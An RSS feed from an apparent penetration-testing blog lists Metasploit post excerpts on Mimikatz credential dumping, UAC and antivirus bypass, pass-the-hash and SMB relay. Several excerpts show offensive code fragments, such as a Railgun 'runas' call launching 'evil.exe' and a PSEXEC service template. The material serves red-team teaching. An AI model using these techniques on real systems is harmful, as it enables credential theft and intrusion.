<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Metasploit on </title>
    <link>https://malicious.link/categories/metasploit/</link>
    <description>Recent content in Metasploit on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 13 Jan 2014 14:32:04 -0500</lastBuildDate>
    
	<atom:link href="https://malicious.link/categories/metasploit/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Installing Metasploit Community Edition on Windows 8</title>
      <link>https://malicious.link/post/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/</link>
      <pubDate>Mon, 13 Jan 2014 14:32:04 -0500</pubDate>
      
      <guid>https://malicious.link/post/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/</guid>
      <description>  Show URL: Hak5
 Youtube URL: YouTube
 Show RSS feed: RSS
  </description>
    </item>
    
    <item>
      <title>Metasploit Minute - Mondays with Mubix - Episode 1</title>
      <link>https://malicious.link/post/2014/2014-01-06-metasploit-minute-mondays-with-mubix/</link>
      <pubDate>Mon, 06 Jan 2014 14:30:08 -0500</pubDate>
      
      <guid>https://malicious.link/post/2014/2014-01-06-metasploit-minute-mondays-with-mubix/</guid>
      <description> Show URL: Hak5
 Youtube URL: YouTube
 Show RSS feed: RSS
   </description>
    </item>
    
    <item>
      <title>Using Mimikatz Alpha or Getting Clear Text Passwords with a Microsoft Tool</title>
      <link>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</link>
      <pubDate>Fri, 07 Jun 2013 15:00:08 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-06-07-using-mimikatz-alpha-or-getting-clear-text-passwords-with-a/</guid>
      <description>Mimikatz is now built into Metasploit&amp;rsquo;s meterpreter, you can do load mimikatz from the meterpreter prompt, but if you don&amp;rsquo;t want to go through the hassle of dealing with AV, reverse or bind payloads, meterpreter binaries, and you have clear text credentials for an admin, you can just use Mimikatz&amp;rsquo;s alpha release that allows you to run Mimikatz on your machine against a process memory dump of LSASS. The great thing about this technique is that the only thing on disk is a Microsoft tool.</description>
    </item>
    
    <item>
      <title>Sessiondump Meterpreter Extension</title>
      <link>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</link>
      <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-04-08-sessiondump-meterpreter-extension/</guid>
      <description>Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory {link} - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.
Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:</description>
    </item>
    
    <item>
      <title>Metasploit Mastery @BlackHatEvents USA 2013</title>
      <link>https://malicious.link/post/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/</link>
      <pubDate>Tue, 19 Mar 2013 14:38:36 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/</guid>
      <description>Just a quick post to say that egypt and I will be giving Metasploit Mastery twice (2 x 2 day sessions) at BlackHat USA 2013. Come out and get your Metasploit on in Vegas w/ us
Linky: http://www.blackhat.com/us-13/training/metasploit-mastery.html
Current fill rate of July 27-28 session: Current fill rate of July 29-30 session: EOM</description>
    </item>
    
    <item>
      <title>Metasploit Mastery meets CanSecWest</title>
      <link>https://malicious.link/post/2013/2013-01-25-metasploit-mastery-meets-cansecwest/</link>
      <pubDate>Fri, 25 Jan 2013 16:12:20 +0000</pubDate>
      
      <guid>https://malicious.link/post/2013/2013-01-25-metasploit-mastery-meets-cansecwest/</guid>
      <description>In 2012 @egypt and I taught Metasploit Mastery for a day and a half @DerbyCon . This was a lot of fun but we had to cram a TON of slides into that short period of time. PLUS we had a CTF at the end where people had to break into a corporate network (virtualized) and sell their shells, data, passwords, or flags to us (egypt and I were acting as opposing countries).</description>
    </item>
    
    <item>
      <title>EXE::Custom in Metasploit&#39;s Java Exploits</title>
      <link>https://malicious.link/post/2012/2012-11-19-execustom-in-metasploits-java-exploits/</link>
      <pubDate>Mon, 19 Nov 2012 05:59:10 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-11-19-execustom-in-metasploits-java-exploits/</guid>
      <description>Let me say first off that this isn&amp;rsquo;t the most elegant of ways to accomplish it. It is in the &amp;ldquo;it works for me&amp;rdquo; stage.
A quick primer on EXE::Custom: This is a setting just like RHOST in Metasploit wherever an EXE is built for Windows payloads. Such as PSEXEC, BypassUAC, etc. It tells Metasploit to ignore all of your payload settings and just use the EXE you have specified. Now this does come at a bit of a cost.</description>
    </item>
    
    <item>
      <title>Finding Admin Access</title>
      <link>https://malicious.link/post/2012/2012-10-31-finding-admin-access/</link>
      <pubDate>Wed, 31 Oct 2012 01:28:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-31-finding-admin-access/</guid>
      <description>You&amp;rsquo;ve got shell, and a set of credentials but you&amp;rsquo;re coming up empty on what you can do with those credentials. This is especially problematic when you can&amp;rsquo;t get past UAC as you are either in a AlwaysNotify situation or not a local admin.
(I&amp;rsquo;m not trying to pull some some &amp;ldquo;insert magic here&amp;rdquo; on the assumption of credentials just at the time of this writing I have only just started working (created a blank file) on a post module to do this as your current user, so until then, you need credentials)</description>
    </item>
    
    <item>
      <title>BypassUAC got a facelift</title>
      <link>https://malicious.link/post/2012/2012-10-30-bypassuac-got-a-facelift/</link>
      <pubDate>Tue, 30 Oct 2012 20:05:21 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-30-bypassuac-got-a-facelift/</guid>
      <description>Dave Kennedy and Kevin Mitnick submitted the &amp;ldquo;bypassuac&amp;rdquo; post module to Metasploit a while back (last DerbyCon?). Which is awesome and they did some fantastic work, but I had a few complaints as probably anyone did who used the module on a somewhat modern network.
&amp;ldquo;Old&amp;rdquo; module post/windows/escalate/bypassuac:
I decided to give it a bit of a face lift:
&amp;ldquo;New&amp;rdquo; local exploit module exploit/windows/local/bypassuac:
All of the credit for the availability of this module goes to @egyp7 though, without his epic addition of local exploits to Metasploit the majority of the updates to this module wouldn&amp;rsquo;t be possible.</description>
    </item>
    
    <item>
      <title>Setting SYSTEM&#39;s proxy settings with Metasploit</title>
      <link>https://malicious.link/post/2012/2012-10-21-setting-systems-proxy-settings-with-metasploit/</link>
      <pubDate>Sun, 21 Oct 2012 07:40:11 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-21-setting-systems-proxy-settings-with-metasploit/</guid>
      <description>One of the great things about the reverse_http(s) payloads is that it is proxy aware. However one of the pitfalls to this is that SYSTEM doesn&amp;rsquo;t have proxy settings, nor do users who have never logged into a system (unless profile loading is triggered). The problem here arrises when you are trying to do anything as SYSTEM, also the PSEXEC only has the option of getting you a SYSTEM shell (so you&amp;rsquo;re done for right out of the door)</description>
    </item>
    
    <item>
      <title>Mounting SMB shares over Meterpreter</title>
      <link>https://malicious.link/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</link>
      <pubDate>Wed, 17 Oct 2012 17:52:30 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-17-mounting-smb-shares-over-meterpreter/</guid>
      <description>Ok, this is pretty straight forward no magic:
Got a shell, doesn&amp;rsquo;t have to be SYSTEM
Add a route to the internal range or directly to the host you want over the session you want
Mosy on over to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. It defaults to 9050 on 127.</description>
    </item>
    
    <item>
      <title>Meet “q” – Free Metasploit Exploit Pack</title>
      <link>https://malicious.link/post/2012/2012-10-04-meet-q-free-metasploit-exploit-pack-html/</link>
      <pubDate>Thu, 04 Oct 2012 09:07:57 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-10-04-meet-q-free-metasploit-exploit-pack-html/</guid>
      <description>Once you’re done staring at the Star Trek deity above (it’s a staring contest you will loose since you a such a simplistic race). I pull your attention to: https://github.com/mubix/q
This repository / exploit pack was created for the sole purpose to house modules, scripts and resource files that would otherwise not be accepted into the Metasploit trunk. It will always be free and anyone is free to submit pulls of modules, scripts or resource files that they created or just found and were not accepted to the trunk because it was just a script, it violates TOS of a service, they did not author it, or any other possible reason.</description>
    </item>
    
    <item>
      <title>Completely In-memory Mimikatz with Metasploit</title>
      <link>https://malicious.link/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/</link>
      <pubDate>Thu, 06 Sep 2012 03:16:47 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/</guid>
      <description>Executing WCE.exe in memory as demoed by Egypt here: https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&amp;rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:
(yes I realize I&amp;rsquo;m running this on disk &amp;lsquo;wce32.exe&amp;rsquo;, but it exhibits the same DLL drop when doing in-memory)
Now, don&amp;rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&amp;rsquo;s the best tool for the job.</description>
    </item>
    
    <item>
      <title>Free Shells with Plink and Pageant</title>
      <link>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</link>
      <pubDate>Tue, 28 Aug 2012 15:42:03 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</guid>
      <description>Watching Egypt’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:
meterpreter &amp;gt; run enum_putty [*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]] [*] Saved SSH Server Public Keys: [*] rsa2@22:172.16.10.150 [*] Session corp_webserver: [*] Protocol: SSH [*] Hostname: 172.16.10.150 [*] Username: root [*] Public Key: meterpreter &amp;gt;  Awesome, this guy runs as root and we have the IP address.</description>
    </item>
    
    <item>
      <title>Raising Zombies in Windows: Part 1 - Passwords</title>
      <link>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</link>
      <pubDate>Tue, 31 Jul 2012 20:20:15 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/</guid>
      <description>With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.
A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:
w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right?</description>
    </item>
    
    <item>
      <title>Cross-Protocol Chained Pass the Hash for Metasploit</title>
      <link>https://malicious.link/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/</link>
      <pubDate>Tue, 10 Jul 2012 06:02:40 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/</guid>
      <description>Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:
Twitter Link: https://twitter.com/webstersprodigy/status/222529916783169536
Which has a link to here: https://github.com/rapid7/metasploit-framework/pull/589
Demo / Example resource files: https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170
You can pull the fork w/ branch from here: https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay
And as soon as you do you can start doing this (using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded):</description>
    </item>
    
    <item>
      <title>Bypassing Trend Micro&#39;s Service Protection</title>
      <link>https://malicious.link/post/2012/2012-07-05-bypassing-trend-micros-service-protection/</link>
      <pubDate>Thu, 05 Jul 2012 03:44:59 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-07-05-bypassing-trend-micros-service-protection/</guid>
      <description>@jabjorkhaug posed the following question on Twitter today:
I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as:
The service binary that is used as part of PSEXEC is located here:
MSF Directory/data/templates/src/pe/exe/service/service.c
The important part to look at starts at line 57:
#define WIN32_LEAN_AND_MEAN #include &amp;lt;windows.h&amp;gt; #define PAYLOAD_SIZE	8192 char cServiceName[32] = &amp;quot;SERVICENAME&amp;quot;; char bPayload[PAYLOAD_SIZE] = &amp;quot;PAYLOAD:&amp;quot;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.</description>
    </item>
    
    <item>
      <title>Netstat Post Module for Meterpreter</title>
      <link>https://malicious.link/post/2012/2012-06-28-netstat-post-module-for-meterpreter/</link>
      <pubDate>Thu, 28 Jun 2012 13:18:52 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-06-28-netstat-post-module-for-meterpreter/</guid>
      <description>Submitted it to MSF via pull request here: https://github.com/rapid7/metasploit-framework/pull/538
Added to trunk: https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb
I promised this one a while ago, sorry for the delay. This only does TCP, it&amp;rsquo;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&amp;rsquo;s real simple, first we&amp;rsquo;ve gotta add the GetTcpTable function to railgun:
session.railgun.add_function(&#39;iphlpapi&#39;, &#39;GetTcpTable&#39;, &#39;DWORD&#39;, [ [&#39;PBLOB&#39;, &#39;pTcpTable&#39;, &#39;out&#39;], [&#39;PDWORD&#39;, &#39;pdwSize&#39;, &#39;inout&#39;], [&#39;BOOL&#39;, &#39;bOrder&#39;, &#39;in&#39;] ])  Then gauge the size of the table:</description>
    </item>
    
    <item>
      <title>Integration of Mimikatz into Metasploit Stage1</title>
      <link>https://malicious.link/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</link>
      <pubDate>Fri, 15 Jun 2012 14:55:55 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</guid>
      <description>One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked.</description>
    </item>
    
    <item>
      <title>Developing the LNK Metasploit post module with Mona</title>
      <link>https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/</link>
      <pubDate>Sun, 19 Feb 2012 05:57:02 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/</guid>
      <description>I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&amp;rsquo;s target.</description>
    </item>
    
    <item>
      <title>MS08_068 &#43; MS10_046 = FUN UNTIL 2018</title>
      <link>https://malicious.link/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/</link>
      <pubDate>Sat, 11 Feb 2012 08:29:37 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/</guid>
      <description>*TL;DR:* SMB Relay + LNK UNC icons = internal pentest pwnage
I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own.
MS08_068: http://www.cvedetails.com/cve/CVE-2008-4037/
In 2008, Microsoft released MS08_068 which patched the &amp;ldquo;SMB Relay&amp;rdquo; attack.</description>
    </item>
    
    <item>
      <title>(UAC) User Assisted Compromise</title>
      <link>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</link>
      <pubDate>Tue, 03 Jan 2012 06:56:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</guid>
      <description>A number of times during tests I&amp;rsquo;ve actually run into those mythical creatures called &amp;ldquo;patched windows machines&amp;rdquo;. At DerbyCon Chris Gates and I released the &amp;ldquo;Ask&amp;rdquo; post module (which I had failed to publish). This module very simply uses the ShellExecute windows function.aspx&amp;rdquo;) via Railgun with the undocumented (but very well known) operator of &amp;lsquo;runas&amp;rsquo;. These two lines accomplished that:
client.railgun.add_function( &#39;shell32&#39;, &#39;ShellExecuteA&#39;, &#39;DWORD&#39;,[[&amp;quot;DWORD&amp;quot;,&amp;quot;hwnd&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpOperation&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpFile&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpParameters&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpDirectory&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;DWORD&amp;quot;,&amp;quot;nShowCmd&amp;quot;,&amp;quot;in&amp;quot;],]) client.railgun.shell32.ShellExecuteA(nil,&amp;quot;runas&amp;quot;,&amp;quot;evil.exe&amp;quot;,nil,nil,5)  This would quite simply prompt the user with that annoying UAC prompt asking the user to run &amp;lsquo;evil.</description>
    </item>
    
    <item>
      <title>Run POST Modules On All Sessions</title>
      <link>https://malicious.link/post/2011/2011-11-02-run-post-modules-on-all-sessions/</link>
      <pubDate>Wed, 02 Nov 2011 03:06:18 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-11-02-run-post-modules-on-all-sessions/</guid>
      <description>Jcran recently blogged about an easy way to run a post module on all sessions:
http://blog.pentestify.com/simple-framework-domain-token-scanner
msf&amp;gt; use post/windows/gather/enum_domain_tokens msf enum_domain_tokens&amp;gt; irb framework.sessions.each do |session| run_single(&amp;quot;set SESSION #{session.first}&amp;quot;) run_single(&amp;quot;run&amp;quot;) sleep 1 end  You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module.</description>
    </item>
    
    <item>
      <title>MSFConsole Prompt Fiddling</title>
      <link>https://malicious.link/post/2011/2011-10-09-msfconsole-prompt-fiddling/</link>
      <pubDate>Sun, 09 Oct 2011 06:20:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-10-09-msfconsole-prompt-fiddling/</guid>
      <description>In @carnal0wnage and my presentation at DerbyCon 2011 we talked about using SCREEN and SCRIPT to keep connections live / use them across SSH sessions, and log everything that happens. What we didn&amp;rsquo;t cover is the fact that there isn&amp;rsquo;t a time stamp for those logs. Now, Metasploit has multiple ways of creating logs:
 cat ~/.msf4/logs/framework.log  This log automatically logs all of the error data that is great for trouble shooting when something is working, but doesn&amp;rsquo;t record what you are doing inside of msfconsole  msf&amp;gt; spool ~/myclient.</description>
    </item>
    
    <item>
      <title>The Dirty Little Secrets They Didn&#39;t Teach You In Pentesting Class</title>
      <link>https://malicious.link/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/</link>
      <pubDate>Thu, 06 Oct 2011 15:53:11 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/</guid>
      <description>Video:  Slides: The Dirty Little Secrets They Didn&amp;rsquo;t Teach You In Pentesting Class [slideshare id=9530403]
Code: https://github.com/mubix/Not-In-Pentesting-Class</description>
    </item>
    
    <item>
      <title>Metasploit Payloads Explained - Part 1b</title>
      <link>https://malicious.link/post/2011/2011-07-17-metasploit-payloads-explained-part-1b/</link>
      <pubDate>Sun, 17 Jul 2011 07:49:34 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-07-17-metasploit-payloads-explained-part-1b/</guid>
      <description>This series was interrupted a bit by the new Metasploit HTTP/HTTPS payloads (more info). Definitely not complaining though as the new features *(as will be discussed in part 2) are some epic new additions to the payloads list. However an important change happened while the craziness over the new payloads was going on. ScriptJunkie snuck in an awesome change to msfvenom (a.k.a. msffsm).
Here is the link to the ticket about the change (link) and the revision (r13057)</description>
    </item>
    
    <item>
      <title>Metasploit Payloads Explained - Part 1a</title>
      <link>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1a/</link>
      <pubDate>Sun, 26 Jun 2011 17:47:23 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1a/</guid>
      <description>In Part 1 I gave an example I used at CCDC with the single &amp;lsquo;windows/download_exec&amp;rsquo;. One of the down sides of that payload is you need to host the binary, giving up an IP/host that can be blocked. Well, Google recently (a couple months ago) allowed people to upload &amp;lsquo;anything&amp;rsquo; to Google docs. And you can then share these files publicly. Probably already see where I&amp;rsquo;m going with this, but here are some steps to get it going, first upload your malicious binary (not the dropper &amp;lsquo;windows/download_exec&amp;rsquo;, but the file it needs to execute).</description>
    </item>
    
    <item>
      <title>Metasploit Payloads Explained - Part 1</title>
      <link>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1/</link>
      <pubDate>Sun, 26 Jun 2011 15:00:00 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1/</guid>
      <description>Payload selection is something that rarely gets talked about in detail. Most PoCs just use calc.exe, netcat, or some kind of socket. The vast majority of Metasploit tutorials, videos and documentation use the _windows/meterpreter/reverse_tcp_ payload which is only one of 224 possible payloads. Here is a little disclaimer: While the payloads in Metasploit don&amp;rsquo;t get updated as much as other parts of Metasploit, this is a point in time documentation of them (June 23, 2011) and the payloads available in Metasploit are constantly changing.</description>
    </item>
    
    <item>
      <title>Remotely Suspend All Threads with Meterpreter</title>
      <link>https://malicious.link/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/</link>
      <pubDate>Mon, 30 May 2011 21:52:59 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/</guid>
      <description>Just a follow up to my previous post. One of the things that sets that method apart is the fact that the suspension (once the DLL injection occurs) comes from within the process, and it suspends all the child processes as well.
Another way you can do this without the injection is just sending a suspend to all the threads in the process.
pid = 2980 targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS) targetprocess.</description>
    </item>
    
    <item>
      <title>Remote DLL Injection with Meterpreter</title>
      <link>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</link>
      <pubDate>Mon, 30 May 2011 16:35:40 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</guid>
      <description>Recently Didier Stevens wrote &amp;lsquo;Suspender.dll&amp;rsquo; which is a DLL that will suspend a process and all of it&amp;rsquo;s child processes after a delay. 60 seconds is it&amp;rsquo;s default but you can rename the DLL to add a number (as such &amp;lsquo;Suspender10.dll&amp;rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: http://blog.didierstevens.com/2011/04/27/suspender-dll/
Jonathan Cran and I had the same idea, as I&amp;rsquo;m sure many others did as well.</description>
    </item>
    
    <item>
      <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit</title>
      <link>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</link>
      <pubDate>Mon, 16 May 2011 02:35:31 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</guid>
      <description>When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:</description>
    </item>
    
    <item>
      <title>Delicious Webapp Hacking</title>
      <link>https://malicious.link/post/2010/2010-12-25-delicious-webapp-hacking/</link>
      <pubDate>Sat, 25 Dec 2010 17:00:36 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-12-25-delicious-webapp-hacking/</guid>
      <description>[UPDATE] This module (enum_delicious) has been pulled from Metasploit since Delicious no longer allows searching by site.
In the last post I showed off how Archive.org&amp;rsquo;s Wayback machine can be used to pull urls for a domain, another place where URLs are stored and can be searched by domain is Delicious.com (a bookmarking service). I&amp;rsquo;ve seen people bookmark everything from internal web portals to urls with special no-auth passwords in them.</description>
    </item>
    
    <item>
      <title>Wayback Webapp Hacking</title>
      <link>https://malicious.link/post/2010/2010-12-24-wayback-webapp-hacking/</link>
      <pubDate>Fri, 24 Dec 2010 19:32:56 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-12-24-wayback-webapp-hacking/</guid>
      <description>Archive.org allows you to check the history of sites and pages, but a service most are not aware of is one that allows you to get a list of every page that a Archive.org has for a given domain. This is great for enumerating a web applications, many times you&amp;rsquo;ll find parts of web apps that have been long forgotten (and usually vulnerable).
This module doesn&amp;rsquo;t make any requests to the targeted domain, it simply outputs a list to the screen/or a file of all the pages it has found on Archive.</description>
    </item>
    
    <item>
      <title>Project Honeypot HTTP Blocklist module</title>
      <link>https://malicious.link/post/2010/2010-12-23-project-honeypot-http-blocklist-module/</link>
      <pubDate>Thu, 23 Dec 2010 23:39:03 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-12-23-project-honeypot-http-blocklist-module/</guid>
      <description>Most malicious IP lists focus on the client side threat, where servers (hosted or exploited) host client side exploits or evil scripting.
These don&amp;rsquo;t really help the server admins very much. Project Honeypot does an amazing job at keeping detailed information on scanners / harvesters and brute forcers, the likes of which are the daily enemy of said admins. They offer a service called HTTP Block List or &amp;lsquo;HTTP:BL&amp;rsquo;.
Another way this list differs from the rest is it isn&amp;rsquo;t a list you can download.</description>
    </item>
    
    <item>
      <title>Silently uninstall SEP</title>
      <link>https://malicious.link/post/2010/2010-11-16-silently-uninstall-sep-html/</link>
      <pubDate>Tue, 16 Nov 2010 05:00:00 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-11-16-silently-uninstall-sep-html/</guid>
      <description>Uninstallation is not new
Deleting and removing things on a box you own isn&amp;rsquo;t new
This method and how to do it remotely was posted in Feb 2007
But I didn&amp;rsquo;t know how to do it, and I thought it was hilarious, so I made a video:
 </description>
    </item>
    
    <item>
      <title>Am I an Admin? Railgun Script</title>
      <link>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</link>
      <pubDate>Mon, 13 Sep 2010 17:45:31 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</guid>
      <description>When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&amp;rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &amp;ldquo;Adminitrators&amp;rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &amp;lsquo;getsystem&amp;rsquo; and if one works other than Kitrap0d. You could also just do a &amp;lsquo;ps&amp;rsquo; and notice that you can see &amp;lsquo;SYSTEM&amp;rsquo; processes.</description>
    </item>
    
    <item>
      <title>Rapid fire PSEXEC for Metasploit</title>
      <link>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</link>
      <pubDate>Sun, 12 Sep 2010 15:06:39 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</guid>
      <description>Exploit modules inside of metasploit don&amp;rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&amp;rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.
// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&amp;rsquo;ve broken it up into sections.</description>
    </item>
    
    <item>
      <title>Metasploit turns 10,000</title>
      <link>https://malicious.link/post/2010/2010-08-13-metasploit-turns-10000/</link>
      <pubDate>Fri, 13 Aug 2010 16:36:46 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-08-13-metasploit-turns-10000/</guid>
      <description>Ask any developer and they will tell you that the age of a project is not calculated in calendar time, but in worker hours or &amp;ldquo;commits&amp;rdquo; to a project. The Metasploit Framework hit 10,000 today.
With the project dating back to 2003, much before the official &amp;ldquo;Revision 1&amp;rdquo; happened, there have been a lot of changes. Going from the initial incarnation as a network &amp;ldquo;game&amp;rdquo; written in perl to the world largest ruby project, the framework has seen it&amp;rsquo;s fair share of blood, sweat, and tears.</description>
    </item>
    
    <item>
      <title>Intro to RailGun: WIN API for Meterpreter</title>
      <link>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</link>
      <pubDate>Thu, 08 Jul 2010 02:10:34 +0000</pubDate>
      
      <guid>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</guid>
      <description>Back on June 13th, &amp;ldquo;Patrick HVE&amp;rdquo; released RAILGUN:
http://mail.metasploit.com/pipermail/framework/2010-June/006382.html
And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712: http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712
